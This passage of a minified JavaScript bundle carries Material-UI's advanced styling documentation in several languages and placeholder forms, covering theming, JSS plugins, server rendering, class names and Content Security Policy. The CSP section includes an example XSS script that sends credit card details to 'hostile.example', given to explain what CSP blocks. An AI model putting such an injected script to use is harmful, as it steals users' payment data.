Buffer(uuidv4()).toString('base64');\n```\n\nIt is very important that you use UUID version 4, as it generates an **unpredictable** string. Vous appliquez ensuite ce nonce à l'en-tête CSP. Un en-tête CSP pourrait ressembler à ceci avec le nonce appliqué:\n\n```js\nheader('Content-Security-Policy')\n  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);\n```\n\nIf you are using Server-Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.\n\n```jsx\n<style\n  id=\"jss-server-side\"\n  nonce={nonce}\n  dangerouslySetInnerHTML={{ __html: sheets.toString() }}\n/>\n```\n\nEnsuite, vous devez transmettre ce nonce à JSS afin qu’il puisse l’ajouter aux balises `<style>` suivantes. The client-side gets the nonce from a header. Vous devez inclure cet en-tête, que le SSR soit utilisé ou non.\n\n```jsx\n<meta property=\"csp-nonce\" content={nonce} />\n```"},ehgw:function(e,n){e.exports="import React from 'react';\nimport { ThemeProvider, makeStyles } from '@material-ui/styles';\n\nconst useStyles = makeStyles((theme: typeof themeInstance) => ({\n  root: {\n    background: theme.background,\n    border: 0,\n    fontSize: 16,\n    borderRadius: 3,\n    boxShadow: '0 3px 5px 2px rgba(255, 105, 135, .3)',\n    color: 'white',\n    height: 48,\n    padding: '0 30px',\n  },\n}));\n\nfunction DeepChild() {\n  const classes = useStyles();\n\n  return (\n    <button type=\"button\" className={classes.root}>\n      Theming\n    </button>\n  );\n}\n\nconst themeInstance = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nexport default function Theming() {\n  return (\n    <ThemeProvider theme={themeInstance}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n"},ewI0:function(e,n){e.exports="# crwdns96872:0crwdne96872:0\n\n<p class=\"description\">crwdns96874:0crwdne96874:0</p>\n\n## crwdns96876:0crwdne96876:0\n\ncrwdns96878:0crwdne96878:0 crwdns96880:0crwdne96880:0\n\n```jsx\ncrwdns96882:0{ ThemeProvider }crwdnd96882:0{theme}crwdne96882:0\n```\n\ncrwdns96884:0crwdne96884:0\n\n### crwdns96886:0crwdne96886:0\n\ncrwdns96888:0crwdne96888:0\n\n#### crwdns96890:0crwdne96890:0\n\n```jsx\ncrwdns96892:0{ useTheme }crwdnd96892:0${theme.spacing}crwdne96892:0\n```\n\ncrwdns96894:0crwdne96894:0\n\n#### crwdns96896:0crwdne96896:0\n\n```jsx\ncrwdns96898:0{ withTheme }crwdnd96898:0${props.theme.spacing}crwdne96898:0\n```\n\ncrwdns96900:0crwdne96900:0\n\n### crwdns96902:0crwdne96902:0\n\ncrwdns96904:0crwdne96904:0 crwdns96906:0crwdne96906:0\n\n```jsx\ncrwdns96908:0{outerTheme}crwdnd96908:0{innerTheme}crwdne96908:0\n```\n\ncrwdns96910:0crwdne96910:0\n\ncrwdns96912:0crwdne96912:0 crwdns96914:0crwdne96914:0\n\n```jsx\ncrwdns96916:0{ darkMode: true, ...outerTheme }crwdne96916:0\n```\n\n## crwdns96918:0crwdne96918:0\n\ncrwdns96920:0crwdne96920:0 crwdns96922:0crwdne96922:0 crwdns96924:0crwdne96924:0 crwdns96926:0crwdne96926:0\n\n```jsx\ncrwdns96928:0{classes.root}crwdnd96928:0{classes.label}crwdne96928:0\n```\n\ncrwdns96930:0crwdne96930:0 crwdns96932:0crwdne96932:0\n\n### crwdns96934:0crwdne96934:0\n\ncrwdns96936:0crwdne96936:0 crwdns96938:0crwdne96938:0\n\n```jsx\ncrwdns96940:0{ classes }crwdnd96940:0{classes.root}crwdnd96940:0{classes.label}crwdnd96940:0{{ label: 'my-label' }}crwdne96940:0\n```\n\n### crwdns96942:0crwdne96942:0\n\ncrwdns96944:0crwdne96944:0 crwdns96946:0crwdne96946:0\n\n```jsx\ncrwdns96948:0{classes.root}crwdnd96948:0{classes.label}crwdnd96948:0{{ label: 'my-label' }}crwdne96948:0\n```\n\n## crwdns96950:0crwdne96950:0\n\ncrwdns96952:0crwdne96952:0\n\ncrwdns96954:0crwdne96954:0 crwdns96956:0crwdne96956:0\n\n- [crwdns96960:0crwdne96960:0](crwdns96958:0crwdne96958:0)\n- [crwdns96964:0crwdne96964:0](crwdns96962:0crwdne96962:0)\n- [crwdns96968:0crwdne96968:0](crwdns96966:0crwdne96966:0)\n- [crwdns96972:0crwdne96972:0](crwdns96970:0crwdne96970:0)\n- [crwdns96976:0crwdne96976:0](crwdns96974:0crwdne96974:0)\n- [crwdns96980:0crwdne96980:0](crwdns96978:0crwdne96978:0)\n- [crwdns96984:0crwdne96984:0](crwdns96982:0crwdne96982:0)\n\ncrwdns96986:0crwdne96986:0 crwdns96988:0crwdne96988:0\n\n```jsx\ncrwdns96990:0{ create }crwdnd96990:0{ StylesProvider, jssPreset }crwdnd96990:0{jss}crwdne96990:0\n    crwdns96992:0crwdne96992:0\n```\n\n## crwdns96994:0crwdne96994:0\n\ncrwdns96996:0crwdne96996:0\n\n```jsx\ncrwdns96998:0crwdne96998:0\n```\n\ncrwdns97000:0crwdne97000:0\n\ncrwdns97002:0crwdne97002:0\n\n## crwdns97004:0crwdne97004:0\n\n> crwdns97006:0crwdne97006:0 crwdns97008:0crwdne97008:0 crwdns97010:0crwdne97010:0\n\ncrwdns97012:0crwdne97012:0 crwdns97014:0crwdne97014:0\n\n### crwdns97016:0crwdne97016:0\n\ncrwdns97018:0crwdne97018:0\n\n```jsx\ncrwdns97020:0{ StylesProvider }crwdne97020:0\n      crwdns97022:0crwdne97022:0 crwdns97024:0crwdne97024:0\n```\n\n### crwdns97026:0crwdne97026:0\n\ncrwdns97028:0crwdne97028:0 crwdns97030:0crwdne97030:0\n\n```jsx\ncrwdns97032:0{ makeStyles }crwdne97032:0\n  crwdns97034:0{className}crwdne97034:0\n```\n\ncrwdns97036:0crwdne97036:0\n\n### crwdns97038:0crwdne97038:0\n\ncrwdns97040:0crwdne97040:0 crwdns97042:0crwdne97042:0\n\n#### crwdns97044:0crwdne97044:0\n\ncrwdns97046:0crwdne97046:0\n\n```html\ncrwdns97048:0crwdne97048:0\n```\n\n```jsx\ncrwdns97050:0{ create }crwdnd97050:0{ StylesProvider, jssPreset }crwdne97050:0\n  crwdns97052:0{jss}crwdne97052:0\n```\n\n#### crwdns97054:0crwdne97054:0\n\ncrwdns97056:0crwdne97056:0 crwdns97058:0crwdne97058:0\n\n```jsx\ncrwdns97060:0crwdne97060:0\n```\n\n```jsx\ncrwdns97062:0{ create }crwdnd97062:0{ StylesProvider, jssPreset }crwdne97062:0\n  crwdns97064:0{jss}crwdne97064:0\n```\n\n#### crwdns97066:0crwdne97066:0\n\ncrwdns97068:0crwdne97068:0 crwdns97070:0crwdne97070:0\n\n```jsx\ncrwdns97072:0{ create }crwdnd97072:0{ StylesProvider, jssPreset }crwdne97072:0\n  crwdns97074:0{jss}crwdne97074:0\n```\n\n## crwdns97076:0crwdne97076:0\n\ncrwdns97078:0crwdne97078:0\n\n```jsx\ncrwdns97080:0{ ServerStyleSheets }crwdnd97080:0${css}crwdnd97080:0${html}crwdne97080:0\n```\n\ncrwdns97082:0crwdne97082:0\n\n### crwdns97084:0crwdne97084:0\n\ncrwdns97086:0crwdne97086:0 crwdns97088:0crwdne97088:0\n\ncrwdns97090:0crwdne97090:0\n\n### crwdns97092:0crwdne97092:0\n\ncrwdns97094:0crwdne97094:0\n\ncrwdns97096:0crwdne97096:0\n\n## crwdns97098:0crwdne97098:0\n\ncrwdns97100:0crwdne97100:0\n\n### crwdns97102:0crwdne97102:0\n\ncrwdns97104:0crwdne97104:0 crwdns97106:0crwdne97106:0\n\n```js\ncrwdns97108:0{\n    opacity: 1,\n  }crwdne97108:0\n```\n\ncrwdns97110:0crwdne97110:0\n\ncrwdns97112:0crwdne97112:0 crwdns97114:0crwdne97114:0\n\n- crwdns97116:0crwdne97116:0\n\n```js\ncrwdns97118:0${sheetName}crwdnd97118:0${ruleName}crwdnd97118:0${identifier}crwdne97118:0\n```\n\n- crwdns97120:0crwdne97120:0\n\n```js\ncrwdns97122:0${productionPrefix}crwdnd97122:0${identifier}crwdne97122:0\n```\n\n### crwdns97124:0crwdne97124:0\n\ncrwdns97126:0crwdne97126:0 crwdns97128:0crwdne97128:0\n\n- crwdns97130:0crwdne97130:0\n- crwdns97132:0crwdne97132:0\n- crwdns97134:0crwdne97134:0\n\ncrwdns97136:0crwdne97136:0 crwdns97138:0crwdne97138:0\n\n```jsx\ncrwdns97140:0$disabledcrwdnd97140:0{ name: 'MuiButton' }crwdne97140:0\n```\n\ncrwdns97142:0crwdne97142:0\n\n```css\ncrwdns97144:0crwdne97144:0\n```\n\n*crwdns97146:0crwdne97146:0*\n\ncrwdns97148:0crwdne97148:0 crwdns97150:0crwdne97150:0 crwdns97152:0crwdne97152:0\n\n```jsx\ncrwdns97154:0{ TextField }crwdne97154:0\n```\n\ncrwdns97156:0crwdne97156:0\n\n## crwdns97158:0crwdne97158:0\n\n### `crwdns97160:0crwdne97160:0`\n\ncrwdns97162:0crwdne97162:0 crwdns97164:0crwdne97164:0\n\ncrwdns97166:0crwdne97166:0\n\n### crwdns97168:0crwdne97168:0\n\ncrwdns97170:0crwdne97170:0\n\ncrwdns97172:0crwdne97172:0\n\n## crwdns97174:0crwdne97174:0\n\ncrwdns97176:0crwdne97176:0 crwdns97178:0crwdne97178:0 crwdns97180:0crwdne97180:0\n\n## crwdns97182:0crwdne97182:0\n\n### crwdns97184:0crwdne97184:0\n\ncrwdns97186:0crwdne97186:0 crwdns97188:0crwdne97188:0 crwdns97190:0crwdne97190:0 crwdns97192:0crwdne97192:0\n\n```html\ncrwdns97194:0crwdne97194:0\n```\n\ncrwdns97196:0crwdne97196:0 crwdns97198:0crwdne97198:0\n\ncrwdns97200:0crwdne97200:0\n\n### crwdns97202:0crwdne97202:0\n\ncrwdns97204:0crwdne97204:0 crwdns97206:0crwdne97206:0 crwdns97208:0crwdne97208:0 crwdns97210:0crwdne97210:0\n\ncrwdns97212:0crwdne97212:0 crwdns97214:0crwdne97214:0\n\n```js\ncrwdns97216:0crwdne97216:0\n```\n\ncrwdns97218:0crwdne97218:0 crwdns97220:0crwdne97220:0 crwdns97222:0crwdne97222:0\n\n```js\ncrwdns97224:0${nonce}crwdne97224:0\n```\n\ncrwdns97226:0crwdne97226:0\n\n```jsx\ncrwdns97228:0{nonce}crwdnd97228:0{{ __html: sheets.toString() }}crwdne97228:0\n```\n\ncrwdns97230:0crwdne97230:0 crwdns97232:0crwdne97232:0 crwdns97234:0crwdne97234:0\n\n```jsx\ncrwdns97236:0{nonce}crwdne97236:0\n```"},g5o9:function(e,n){e.exports="# Avanzado\n\n<p class=\"description\">This section covers more advanced usage of @material-ui/styles.</p>\n\n## Temática\n\nAdd a `ThemeProvider` to the top level of your app to pass the theme down the React component tree. Then, you can access the theme object in style functions.\n\n```jsx\nimport { ThemeProvider } from '@material-ui/styles';\n\nconst theme = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nfunction Theming() {\n  return (\n    <ThemeProvider theme={theme}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/Theming.js\"}}\n\n### Accediendo al tema en un componente\n\nYou might need to access the theme variables inside your React components.\n\n#### `useTheme` hook\n\n```jsx\nimport { useTheme } from '@material-ui/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/UseTheme.js\"}}\n\n#### `withTheme` HOC\n\n```jsx\nimport { withTheme } from '@material-ui/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme(DeepChildRaw);\n```\n\n{{\"demo\": \"pages/styles/advanced/WithTheme.js\"}}\n\n### Theme nesting\n\nYou can nest multiple theme providers. This can be really useful when dealing with different areas of your application that have distinct appearance from each other.\n\n```jsx\n<ThemeProvider theme={outerTheme}>\n  <Child1 />\n  <ThemeProvider theme={innerTheme}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n{{\"demo\": \"pages/styles/advanced/ThemeNesting.js\"}}\n\nEl tema interno **sobreescribirá** el tema exterior. Puede ampliar el tema externo proporcionando una función:\n\n```jsx\n<ThemeProvider theme={…} >\n  <Child1 />\n  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n## Overriding styles - `classes` prop\n\nThe `makeStyles` (hook generator) and `withStyles` (HOC) APIs allow the creation of multiple style rules per style sheet. Each style rule has its own class name. The class names are provided to the component with the `classes` variable. This is particularly useful when styling nested elements in a component.\n\n```jsx\n// A style sheet\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles();\n  return (\n    <button className={classes.root}> // 'jss1'\n      <span className={classes.label}> // 'jss2'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested />\n}\n```\n\nHowever, the class names are often non-deterministic. How can a parent component override the style of a nested element?\n\n### withStyles\n\nThis is the simplest case. the wrapped component accepts a `classes` prop, it simply merges the class names provided with the style sheet.\n\n```jsx\nconst Nested = withStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n})(({ classes }) => (\n  <button className={classes.root}>\n    <span className={classes.label}> // 'jss2 my-label'\n      Nested\n    </span>\n  </button>\n));\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n### makeStyles\n\nThe hook API requires a bit more work. You have to forward the parent props to the hook as a first argument.\n\n```jsx\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles(props);\n  return (\n    <button className={classes.root}>\n      <span className={classes.label}> // 'jss2 my-label'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n## JSS plugins\n\nJSS uses plugins to extend its core, allowing you to cherry-pick the features you need, and only pay the performance overhead for what you are using.\n\nNot all the plugins are available in Material-UI by default. The following (which is a subset of [jss-preset-default](https://cssinjs.org/jss-preset-default/)) are included:\n\n- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)\n- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)\n- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)\n- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)\n- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)\n- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)\n\nOf course, you are free to use additional plugins. Here is an example with the [jss-rtl](https://github.com/alitaheri/jss-rtl) plugin.\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\nimport rtl from 'jss-rtl'\n\nconst jss = create({\n  plugins: [...jssPreset().plugins, rtl()],\n});\n\nfunction App() {\n  return (\n    <StylesProvider jss={jss}>\n      ...\n    </StylesProvider>\n  );\n}\n\nexport default App;\n```\n\n## String templates\n\nIf you prefer CSS syntax over JSS, you can use the [jss-plugin-template](https://cssinjs.org/jss-plugin-template/) plugin.\n\n```jsx\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n```\n\nNote that this doesn't support selectors, or nested rules.\n\n{{\"demo\": \"pages/styles/advanced/StringTemplates.js\"}}\n\n## CSS injection order\n\n> It's **really important** to understand how the CSS specificity is calculated by the browser. It's one of the key elements to know when overriding styles. We **encourage** you to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)\n\nBy default, the style tags are injected **last** in the `<head>` element of the page. They gain more specificity than any other style tags on your page e.g. CSS modules, styled components.\n\n### injectFirst\n\nThe `StylesProvider` component has an `injectFirst` prop to inject the style tags **first** in the head (less priority):\n\n```jsx\nimport { StylesProvider } from '@material-ui/styles';\n\n<StylesProvider injectFirst>\n  {/* Your component tree.\n      Styled components can override Material-UI's styles. */}\n</StylesProvider>\n```\n\n### `makeStyles` / `withStyles` / `styled`\n\nThe injection of style tags happens in the **same order** as the `makeStyles` / `withStyles` / `styled` invocations. For instance the color red wins in this case:\n\n```jsx\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/styles';\n\nconst useStylesBase = makeStyles({\n  root: {\n    color: 'blue', // 🔵\n  },\n});\n\nconst useStyles = makeStyles({\n  root: {\n    color: 'red', // 🔴\n  },\n});\n\nexport default function MyComponent() {\n  // Order doesn't matter\n  const classes = useStyles();\n  const classesBase = useStylesBase();\n\n  // Order doesn't matter\n  const className = clsx(classes.root, classesBase.root)\n\n  // color: red 🔴 wins.\n  return <div className={className} />;\n}\n```\n\nThe hook call order and the class name concatenation order **don't matter**.\n\n### insertionPoint\n\nJSS [provides a mechanism](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) to control this situation. By adding an `insertionPoint` within the HTML you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.\n\n#### HTML comment\n\nThe simplest approach is to add an HTML comment to the `<head>` that determines where JSS will inject the styles:\n\n```html\n<head>\n  \x3c!-- jss-insertion-point --\x3e\n  <link href=\"...\">\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n#### Other HTML element\n\n[Create React App](https://github.com/facebook/create-react-app) strips HTML comments when creating the production build. To get around this issue, you can provide a DOM element (other than a comment) as the JSS insertion point, for example, a `<noscript>` element:\n\n```jsx\n<head>\n  <noscript id=\"jss-insertion-point\" />\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: document.getElementById('jss-insertion-point'),\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n#### JS createComment\n\ncodesandbox.io prevents access to the `<head>` element. To get around this issue, you can use the JavaScript `document.createComment()` API:\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst styleNode = document.createComment('jss-insertion-point');\ndocument.head.insertBefore(styleNode, document.head.firstChild);\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n## Server-side rendering\n\nThis example returns a string of HTML and inlines the critical CSS required, right before it’s used:\n\n```jsx\nimport ReactDOMServer from 'react-dom/server';\nimport { ServerStyleSheets } from '@material-ui/styles';\n\nfunction render() {\n  const sheets = new ServerStyleSheets();\n\n  const html = ReactDOMServer.renderToString(sheets.collect(<App />));\n  const css = sheets.toString();\n\n  return `\n<!DOCTYPE html>\n<html>\n  <head>\n    <style id=\"jss-server-side\">${css}</style>\n  </head>\n  <body>\n    <div id=\"root\">${html}</div>\n  </body>\n</html>\n  `;\n}\n```\n\nYou can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets`](/styles/api/#serverstylesheets) API documentation.\n\n### Gatsby\n\nWe have [an official plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`. Refer to the plugin's page for setup and usage instructions.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/gatsby) for an up-to-date usage example.\n\n### Next.js\n\nYou need to have a custom `pages/_document.js`, then copy [this logic](https://github.com/mui-org/material-ui/blob/master/examples/nextjs/pages/_document.js) to inject the server-side rendered styles into the `<head>` element.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/nextjs) for an up-to-date usage example.\n\n## Class names\n\nThe class names are generated by [the class name generator](/styles/api/#creategenerateclassname-options-class-name-generator).\n\n### Default\n\nBy default, the class names generated by `@material-ui/styles` are **non-deterministic**; you can't rely on them to stay the same. Let's take the following style as an example:\n\n```js\nconst useStyles = makeStyles({\n  root: {\n    opacity: 1,\n  },\n});\n```\n\nThis will generate a class name such as `makeStyles-root-123`.\n\nYou have to use the `classes` prop of a component to override the styles. The non-deterministic nature of the class names enables style isolation.\n\n- In **development**, the class name is: `.makeStyles-root-123`, following this logic:\n\n```js\nconst sheetName = 'makeStyles';\nconst ruleName = 'root';\nconst identifier = 123;\n\nconst className = `${sheetName}-${ruleName}-${identifier}`;\n```\n\n- In **production**, the class name is: `.jss123`, following this logic:\n\n```js\nconst productionPrefix = 'jss';\nconst identifier = 123;\n\nconst className = `${productionPrefix}-${identifier}`;\n```\n\n### With `@material-ui/core`\n\nThe generated class names of the `@material-ui/core` components behave differently. When the following conditions are met, the class names are **deterministic**:\n\n- Only one theme provider is used (**No theme nesting**)\n- The style sheet has a name that starts with `Mui` (all Material-UI components).\n- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).\n\nThese conditions are met with the most common use cases of `@material-ui/core`. For instance, this style sheet:\n\n```jsx\nconst useStyles = makeStyles({\n  root: { /* … */ },\n  label: { /* … */ },\n  outlined: {\n    /* … */\n    '&$disabled': { /* … */ },\n  },\n  outlinedPrimary: {\n    /* … */\n    '&:hover': { /* … */ },\n  },\n  disabled: {},\n}, { name: 'MuiButton' });\n```\n\ngenerates the following class names that you can override:\n\n```css\n.MuiButton-root { /* … */ }\n.MuiButton-label { /* … */ }\n.MuiButton-outlined { /* … */ }\n.MuiButton-outlined.Mui-disabled { /* … */ }\n.MuiButton-outlinedPrimary: { /* … */ }\n.MuiButton-outlinedPrimary:hover { /* … */ }\n```\n\n*This is a simplification of the `@material-ui/core/Button` component's style sheet.*\n\nCustomization of the TextField can be cumbersome with the [`classes` API](#overriding-styles-classes-prop), where you have to define the the classes prop. It's easier to use the default values, as described above. For example:\n\n```jsx\nimport styled from 'styled-components';\nimport { TextField } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.focused {\n    color: green; 💚\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red; 💔\n    }\n    &:hover fieldset {\n      border-color: yellow; 💛\n    }\n    &.Mui-focused fieldset {\n      border-color: green; 💚\n    }\n  }\n`;\n```\n\n{{\"demo\": \"pages/styles/advanced/GlobalClassName.js\"}}\n\n## Global CSS\n\n### `jss-plugin-global`\n\nThe [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset. You can use it to define global class names.\n\n{{\"demo\": \"pages/styles/advanced/GlobalCss.js\"}}\n\n### Hybrid\n\nYou can also combine JSS generated class names with global ones.\n\n{{\"demo\": \"pages/styles/advanced/HybridGlobalCss.js\"}}\n\n## CSS prefixes\n\nJSS uses feature detection to apply the correct prefixes. [Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.\n\n## Content Security Policy (CSP)\n\n### What is CSP and why is it useful?\n\nBasically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:\n\n```html\n<script>\n  sendCreditCardDetails('https://hostile.example');\n<\/script>\n```\n\nThis vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.\n\nYou can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).\n\n### How does one implement CSP?\n\nIn order to use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.\n\nA CSP nonce is a Base 64 encoded string. You can generate one like this:\n\n```js\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new Buffer(uuidv4()).toString('base64');\n```\n\nIt is very important that you use UUID version 4, as it generates an **unpredictable** string. You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:\n\n```js\nheader('Content-Security-Policy')\n  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);\n```\n\nIf you are using Server-Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.\n\n```jsx\n<style\n  id=\"jss-server-side\"\n  nonce={nonce}\n  dangerouslySetInnerHTML={{ __html: sheets.toString() }}\n/>\n```\n\nThen, you must pass this nonce to JSS so it can add it to subsequent `<style>` tags. The client-side gets the nonce from a header. You must include this header regardless of whether or not SSR is used.\n\n```jsx\n<meta property=\"csp-nonce\" content={nonce} />\n```"},gjvq:function(e,n,t){"use strict";function s(e){return Object.prototype.toString.call(e).slice(8,-1)}function r(e){return"Object"===s(e)&&(e.constructor===Object&&Object.getPrototypeOf(e)===Object.prototype)}function o(e){return"Array"===s(e)}function a(e){return"Symbol"===s(e)}function i(e,n,t,s){var r=s.propertyIsEnumerable(n)?"enumerable":"nonenumerable";"enumerable"===r&&(e[n]=t),"nonenumerable"===r&&Object.defineProperty(e,n,{value:t,enumerable:!1,writable:!0,configurable:!0})}n.a=function(e){for(var n=[],t=1;t<arguments.length;t++)n[t-1]=arguments[t];var s=null,l=e;return r(e)&&e.extensions&&1===Object.keys(e).length&&(l={},s=e.extensions),n.reduce(function(e,n){return function e(n,t,s){if(!r(t))return s&&o(s)&&s.forEach(function(e){t=e(n,t)}),t;var l={};if(r(n)){var c=Object.getOwnPropertyNames(n),d=Object.getOwnPropertySymbols(n);l=c.concat(d).reduce(function(e,s){var r=n[s];return(!a(s)&&!Object.getOwnPropertyNames(t).includes(s)||a(s)&&!Object.getOwnPropertySymbols(t).includes(s))&&i(e,s,r,n),e},{})}var u=Object.getOwnPropertyNames(t),m=Object.getOwnPropertySymbols(t);return u.concat(m).reduce(function(a,l){var c=t[l],d=r(n)?n[l]:void 0;return s&&o(s)&&s.forEach(function(e){c=e(d,c)}),void 0!==d&&r(c)&&(c=e(d,c,s)),i(a,l,c,t),a},l)}(e,n,s)},l)}},hDXk:function(e,n){e.exports="import React from 'react';\nimport { ThemeProvider, useTheme } from '@material-ui/styles';\n\ninterface MyTheme {\n  spacing: string;\n}\n\nfunction DeepChild() {\n  const theme = useTheme<MyTheme>();\n\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n\nexport default function UseTheme() {\n  return (\n    <ThemeProvider<MyTheme>\n      theme={{\n        spacing: '8px',\n      }}\n    >\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n"},"jN+d":function(e,n,t){"use strict";t.r(n),t.d(n,"default",function(){return l});var s=t("mXGw"),r=t.n(s),o=t("3O2h"),a=Object(o.a)({"@global":{".cssjss-advanced-global-root":{height:100,width:100,backgroundColor:"blue"},".cssjss-advanced-global-child":{height:8,backgroundColor:"red"}}}),i=r.a.createElement("div",{className:"cssjss-advanced-global-root"},r.a.createElement("div",{className:"cssjss-advanced-global-child"}));function l(){return a(),i}},kGIj:function(e,n,t){"use strict";t.d(n,"a",function(){return i});var s=t("wuQJ"),r=t.n(s),o=t("81nG"),a=t.n(o);function i(e,n){return n||(n=e.slice(0)),a()(r()(e,{raw:{value:a()(n)}}))}},kLTm:function(e,n,t){"use strict";t.d(n,"b",function(){return p});var s=t("Rbzu"),r=t("2Fjn"),o=t("mXGw"),a=t.n(o),i=t("CWZi"),l=t("XpU0"),c=t("ADfD"),d=t("Hg0Q"),u=t("ny+v"),m=t("dml9"),p=function(e){return{root:{},select:{"-moz-appearance":"none","-webkit-appearance":"none",userSelect:"none",borderRadius:0,minWidth:16,cursor:"pointer","&:focus":{backgroundColor:"light"===e.palette.type?"rgba(0, 0, 0, 0.05)":"rgba(255, 255, 255, 0.05)",borderRadius:0},"&::-ms-expand":{display:"none"},"&$disabled":{cursor:"default"},"&[multiple]":{height:"auto"},"&:not([multiple]) option, &:not([multiple]) optgroup":{backgroundColor:e.palette.background.paper}},filled:{},outlined:{borderRadius:e.shape.borderRadius},selectMenu:{height:"auto",textOverflow:"ellipsis",whiteSpace:"nowrap",overflow:"hidden"},disabled:{},icon:{position:"absolute",right:0,top:"calc(50% - 12px)",color:e.palette.action.active,pointerEvents:"none"}}},h=a.a.createElement(m.a,null),f=a.a.forwardRef(function(e,n){var t=e.children,o=e.classes,l=e.IconComponent,m=void 0===l?u.a:l,p=e.input,f=void 0===p?h:p,g=e.inputProps,y=(e.variant,Object(r.a)(e,["children","classes","IconComponent","input","inputProps","variant"])),b=Object(d.a)(),v=Object(c.a)({props:e,muiFormControl:b,states:["variant"]});return 